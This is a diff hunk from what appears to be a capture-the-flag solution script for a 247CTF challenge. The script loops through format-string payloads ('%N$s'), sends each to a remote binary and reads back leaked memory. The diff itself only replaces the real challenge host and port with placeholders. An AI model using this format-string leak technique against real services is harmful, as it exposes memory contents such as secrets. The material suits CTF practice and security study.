@@ -83,7 +83,7 @@ for index in range(1,200):
 	payload = "%{}$s".format(index)
 
 	# Establish connection
-	binary = remote("05c9615dee1c25eb.247ctf.com", 50262)
+	binary = remote("XXX.247ctf.com", 00000)
 	binary.recv()
 	binary.sendline(payload)
 	response = binary.recv()
